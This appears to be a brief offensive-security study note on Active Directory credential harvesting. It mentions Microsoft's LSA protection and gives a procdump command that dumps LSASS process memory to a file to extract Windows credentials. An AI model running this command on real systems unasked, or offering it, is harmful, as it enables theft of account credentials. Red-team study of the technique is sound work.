

For [[AD-Credential-Harvesting]] you can dump lssas for credentials. In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. 
```powershell
procdump.exe -accepteula -ma lsass.exe C:\Users\Administrator\Desktop\lsass_dump
```